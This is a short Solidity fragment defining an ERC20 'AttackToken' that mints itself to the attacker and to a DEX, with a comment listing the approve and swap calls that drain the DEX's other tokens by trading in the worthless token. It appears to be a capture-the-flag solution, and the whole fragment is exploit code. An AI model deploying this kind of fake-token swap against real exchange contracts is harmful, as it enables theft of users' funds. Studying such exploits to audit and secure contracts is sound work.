...
contract AttackToken is ERC20 {
    constructor(address dex_address) public ERC20("test", "test") {
        _mint(msg.sender, 10000);
        _mint(dex_address, 100);
    }
    /*
        attack:
        token3.approve(address(dex), 1000000);
        dex.approve(address(dex), 1000000);
        dex.swap(address(token3), t1, 100);
        dex.swap(address(token3), t2, 200);
    */
}
